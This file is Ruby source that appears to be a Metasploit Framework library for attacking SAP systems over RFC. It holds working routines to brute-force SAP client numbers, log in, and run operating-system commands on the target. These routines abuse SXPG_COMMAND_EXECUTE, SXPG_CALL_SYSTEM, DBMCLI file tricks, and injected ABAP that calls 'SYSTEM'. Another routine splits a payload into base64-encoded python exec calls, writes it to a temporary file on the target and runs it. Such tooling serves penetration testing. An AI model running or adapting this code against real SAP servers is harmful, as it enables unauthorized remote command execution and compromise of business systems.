# -*- coding: binary -*-

###
#
# Common SAP methods
#
###

begin
  require 'nwrfc'
rescue LoadError
  elog('The SAP RFC Modules require the NW RFC SDK ruby wrapper (http://rubygems.org/gems/nwrfc)
       from Martin Ceronio. They also require the NW RFC SDK available from SAP. Place these in
       the /usr/sap/rfcsdk/lib and /usr/sapnwrfcsdk/lib directories and export your LD_LIBRARY_PATH.')
end

module Msf
module Exploit::SAP
module RFC

  begin
    include NWRFC
    @@NWRFC_MODULES_LOADED = true
  rescue NameError
    @@NWRFC_MODULES_LOADED = false
  end

  def print_nwrfc_error
    unless @@NWRFC_MODULES_LOADED
      print_warning("*"*72)
      print_warning("*%red"+"The NW RFC SDK could not be loaded.".center(70)+"%clr*")
      print_warning("*%red"+"Is the SDK in your LD_LIBRARY_PATH?".center(70)+"%clr*")
      print_warning("*%red"+"export LD_LIBRARY_PATH=/usr/sap/rfcsdk/lib:/usr/sap/nwrfcsdk/lib".center(70)+"%clr*")
      print_warning("*%red"+"https://github.com/mydoghasworms/nwrfc".center(70)+"%clr*")
      print_warning("*"*72)
    end
  end

  def init_ui(input=nil, output=nil)
    super(input, output)
    print_nwrfc_error
  end

  def setup
    unless @@NWRFC_MODULES_LOADED
      raise LoadError, 'No NWRFC SDK'
    end
    super
  end

  def initialize(info = {})
    super
    register_options(
      [
        Opt::RPORT(3300),
        OptString.new('CLIENT', [true, 'Client', '000']),
        OptString.new('SRHOST', [false, 'SAP Router Address', nil]),
      ], self.class)

    register_advanced_options(
      [
          OptInt.new('NWRFC_CALL_TIMEOUT', [true, 'Timeout for calls to native code', 10]),
      ], self.class)
  end

  def call_timeout
    datastore['NWRFC_CALL_TIMEOUT']
  end

  def system_number(rport=nil)
    if rport
      rport.to_s[-2..-1]
    else
      datastore['RPORT'].to_s[-2..-1]
    end
  end

  def client
    datastore['CLIENT']
  end

  def rhost
    datastore['RHOST']
  end

  def rport
    datastore['RPORT']
  end

  def client_list
    if client.nil?
      print_status("Using default SAP client list")
      clients = ['000', '001', '066']
    else
      if client =~ /^\d{3},/
        clients = datastore['CLIENT'].split(/,/)
        print_status("Brute forcing clients #{client}")
      elsif
        client =~ /^\d{3}-\d{3}\z/
        array = client.split(/-/)
        clients = (array.at(0)..array.at(1)).to_a
        print_status("Brute forcing clients #{client}")
      elsif
        client =~ /^\d{3}\z/
        clients = [client]
        print_status("Brute forcing client #{client}")
      else
        print_status("Invalid CLIENT - using default SAP client list instead")
        clients = ['000', '001', '066']
      end
    end

    clients
  end

  def auth_hash(rhost, rport, client, username, password)
    ashost = rhost
    sysnr = system_number(rport)

    unless datastore['SRHOST'].blank?
      ashost = "/H/#{datastore['SRHOST']}/H/#{rhost}"
    end

    {"user" => username, "passwd" => password, "client" => client, "ashost" => ashost, "sysnr" => sysnr}
  end

  #
  # Logs into a SAP RFC endpoint. Calling this with a block ensures that the
  # connection is closed after use and it spawns the RFC call in a new thread
  # allowing datastore['NWRFC_CALL_TIMEOUT'] to determine how long to wait for
  # the call to return. This is required to protect against calls to non-
  # returning functions (e.g. starting a process that doesn't close).
  #
  # If used without a block the caller should make sure the connection is
  # closed and the connection object should exist only within the bounds of
  # any new threads created. See SAP note 513386:
  #
  # The recommended procedure for multithreaded applications is, however,
  # not to share any JCO.Client instances via several threads at all, but
  # rather to use an individual instance for each thread.The JCo client
  # pooling mechanism offers a special service here, as you can use it to
  # fetch a client from the pool as required, use it for your function call
  # and then return it to the pool.Multithreading and synchronization problems
  # do not then even arise
  #
  def login(rhost, rport, client, username, password)
    conn = nil
    return conn unless block_given?

    r = Rex::Text.rand_text_alphanumeric(6)
    begin
      t = framework.threads.spawn("nwrfc-#{r}", false) do
        ah = auth_hash(rhost, rport, client, username, password)
        begin
          conn = Connection.new(ah)
          yield conn
        rescue NWError => e
          case e.code
            when :RFC_COMMUNICATION_FAILURE
              errno, errtext = parse_comm_exception(e)
              vprint_error("#{rhost}:#{rport} [SAP] #{e.code} - #{errtext}")
            else
              vprint_status("#{rhost}:#{rport} [SAP] #{e.code} - #{e.message}")
          end

          raise e
        ensure
          conn.disconnect if conn
        end
      end

      res = t.join(call_timeout)
      if res.nil?
        vprint_error("#{rhost}:#{rport} [SAP] NWRFC Call Time Out")
      end
    ensure
      t.kill
    end

    nil
  end

  def run_function(conn, function_name, opts)
    fc = nil

    function = conn.get_function(function_name)
    fc = function.get_function_call

    opts.each do |key,value|
      fc[key] = value
    end

    fc.invoke

    fc
  end

  def parse_comm_exception(exception)
    errno = nil
    errno_text = nil
    exception.message.each_line do |line|
      if line =~ /^ERRNO\s+(\d+)$/
        errno = $1
      elsif line =~ /^ERRNO TEXT\s+([\w ]+)$/
        errno_text = $1
      elsif line =~ /^ERROR\s+(.+)$/
        errno_text = $1
      end
    end

    return errno, errno_text
  end

  def dbmcli_write(os, cmd, file, bg=false)
    raise RuntimeError, "Empty command" if cmd.blank?

    random_db = Rex::Text.rand_text_alpha(1)

    command = ''
    if os.downcase.include? 'linux'
      cmd = cmd.gsub(" ","\t")
      command = "-o /tmp/#{file} -n #{random_db}\n!"
      command << cmd
      command << "\t&" if bg
      command << "\n"
    else
      space = "%programfiles:~10,1%"
      cmd = cmd.gsub(" ",space)
      command = "-o c:\\#{file} -n #{random_db}\r\n!"
      command << "#{cmd}\r\n"
    end

    command
  end

  def dbmcli_execute(os, file)
    command = ''
    if os.downcase.include? 'linux'
      command = "-ic /tmp/#{file}"
    else
      command = "-ic c:\\#{file}"
    end

    command
  end

  # Encodes a shell command line into an os.system() python call.
  def encode_command_python(cmd)
    cmd.gsub!('"', '\\\\"')
    cmd.gsub!("'", '\\\\"')
    py_cmd = "import os;print os.system(\"#{cmd}\")"

    py_cmd
  end

  # Encodes python into an X_PYTHON -c exec(python)
  # call.
  def encode_python(python)
    python.gsub!('\\', '\\\\\\')
    python.gsub!('"', '\\\"')
    python.gsub!(';','"+chr(59)+"')
    py_exec = "-c '%exec(\"#{python}\")%'"

    py_exec
  end

  # Base64 encodes python into an X_PYTHON -c
  # exec(python.decode("base64")) call.
  def encode_python_base64(python)
    b64 = Rex::Text.encode_base64(python)
    py_exec = "-c exec(\"#{b64}\".decode(\"base64\"))"

    py_exec
  end

  def python_sxpg_execute(call_system=false)
    opts = {}
    opts[:COMMANDNAME] = 'X_PYTHON'
    if call_system
      rfc = method(:sxpg_call_system)
      split = 21
    else
      rfc = method(:sxpg_command_execute)
      opts[:OPERATINGSYSTEM] = 'ANYOS'
      split = 100
    end

    file = nil
    login(rhost, rport, client, datastore['USERNAME'], datastore['PASSWORD']) do |conn|
      opts[:ADDITIONAL_PARAMETERS] = encode_python("import tempfile;print tempfile.mkstemp()[1]")
      file = rfc.call(conn, opts).strip
    end

    pay = payload.encoded.gsub("'","\\\\'")

    splitz = pay.scan(/.{1,#{split}}/)

    cmds = []
    splitz.each do |part|
      if part == splitz.first
        cmd = encode_python_base64("f=open('#{file}','w');f.write('#{part}');f.close();")
      else
        cmd = encode_python_base64("f=open('#{file}','a');f.write('#{part}');f.close();")
      end

      cmds << cmd
    end

    cmds << file

    print_status("Writing python to #{file}...")
    login(rhost, rport, client, datastore['USERNAME'], datastore['PASSWORD']) do |conn|
      vprint_line rfc.call(conn, opts)
      cmds.each do |cmd|
        opts[:ADDITIONAL_PARAMETERS] = cmd
        if cmd == cmds.last
          print_status("Executing #{file}, please wait for the call to timeout before interacting")
          vprint_line rfc.call(conn, opts)
          return
        else
          vprint_line rfc.call(conn, opts)
        end
      end
    end
  end

  def dbmcli_sxpg_execute(os, cmd, opts, call_system=true)
    raise RuntimeError, "Empty command" if cmd.blank?

    # this code is common for sxpg_call_system and sxpg_command_execute
    # so just grab a pointer to the correct rfc technique
    if call_system
      rfc = method(:sxpg_call_system)
    else
      rfc = method(:sxpg_command_execute)
    end

    file = Rex::Text.rand_text_alpha(4)

    rhost = opts[:rhost]
    rport = opts[:rport]
    client = opts[:client]
    user = opts[:user]
    pass = opts[:pass]
    bg = opts[:bg]

    command = dbmcli_write(os, cmd, file, bg)

    result = nil

    login(rhost, rport, client, user, pass) do |conn|
      conn.connection_info

      begin
        opts = {}
        opts[:COMMANDNAME] = 'DBMCLI'
        opts[:OPERATINGSYSTEM] = 'ANYOS' unless call_system
        opts[:ADDITIONAL_PARAMETERS] = command
        data  = rfc.call(conn, opts)

        if data =~ /No such file or directory/im
          print_error("#{rhost}:#{rport} [SAP] DBMCLI does not exist on this host")
        else
          run_command = dbmcli_execute(os, file)
          opts[:ADDITIONAL_PARAMETERS] = run_command
          data  = rfc.call(conn, opts)

          if data.blank?
            print_error("#{rhost}:#{rport} [SAP] No output received")
          elsif data.include? '---'
            start_idx = data.index('---') + 3
            end_idx = data.index('---', start_idx)
            result = data[start_idx...end_idx]
          end
        end
      rescue NWError => e
        print_error("#{rhost}:#{rport} [SAP] #{e.code} - #{e.message}")
      end
    end

    result
  end

  def sxpg_command_execute(conn, opts)
    data = ''

    command_length = opts[:ADDITIONAL_PARAMETERS].length

    if command_length  > 255
      # NB Can still get errors if SM69 is supplying its own parameters
      # which cause this to exceed 255 chars.
      raise RuntimeError, "SXPG_COMMAND_EXECUTE Command Length exceeds maximum 255 characters: #{command_length}"
    end

    fc = run_function(conn, "SXPG_COMMAND_EXECUTE", opts)

    data_length = fc[:EXEC_PROTOCOL].size

    0.upto(data_length-1) do |i|
      data << fc[:EXEC_PROTOCOL][i][:MESSAGE] << "\n"
    end

    data
  end

  def sxpg_call_system(conn, opts)
    data = ''

    command_length = opts[:ADDITIONAL_PARAMETERS].length
    if command_length > 255
      # NB Can still get errors if SM69 is supplying its own parameters
      # which cause this to exceed 255 chars.
      raise RuntimeError, "SXPG_CALL_SYSTEM ADDITIONAL_PARAMETERS exceeds maximum 255 characters: #{command_length}"
    end

    fc = run_function(conn, "SXPG_CALL_SYSTEM", opts)

    data_length = fc[:EXEC_PROTOCOL].size

    0.upto(data_length-1) do |i|
      data << fc[:EXEC_PROTOCOL][i][:MESSAGE] << "\n"
    end

    data
  end

  def rfc_abap_install_and_run(conn, code)
    conn.connection_info
    function = conn.get_function("RFC_ABAP_INSTALL_AND_RUN")
    fc = function.get_function_call
    code.each_line do |line|
      fc[:PROGRAM].new_row {|row| row[:LINE] = line.strip}
    end

    fc.invoke

    fc[:WRITES]
  end

  def rfc_abap_install_and_run_cmd(conn, cmd)
    escapes = cmd.count("'")
    final_length = cmd.length + escapes
    raise RuntimeError, "Command is too large: #{final_length}" if final_length > 255

    code = "REPORT EXTRACT LINE-SIZE 255 NO STANDARD PAGE HEADING.\r\n"
    code << "TYPES lt_line(255) TYPE c.\r\n"
    code << "DATA lv_cmd(#{final_length}) TYPE c.\r\n"
    code << "DATA lt_result TYPE STANDARD TABLE OF lt_line WITH HEADER LINE.\r\n"
    code << "lv_cmd =\r\n"

    cmd_split = cmd.scan(/.{1,50}/)
    cmd_split.each do |line|
      l = line.gsub("'","''")
      if line == cmd_split.last
        code << "'#{l}'.\r\n"
      else
        code << "'#{l}'&\r\n"
      end
    end
    code << "CALL 'SYSTEM' ID 'COMMAND' FIELD lv_cmd\r\n"
    code << "ID 'TAB' FIELD lt_result-*sys*.\r\n"
    code << "LOOP AT lt_result.\r\n"
    code << "WRITE : / lt_result.\r\n"
    code << "ENDLOOP.\r\n"

    result = rfc_abap_install_and_run(conn, code)
    data = ''
    result.each do |row|
      data << row[:ZEILE] << "\n"
    end

    data
  end

end
end
end

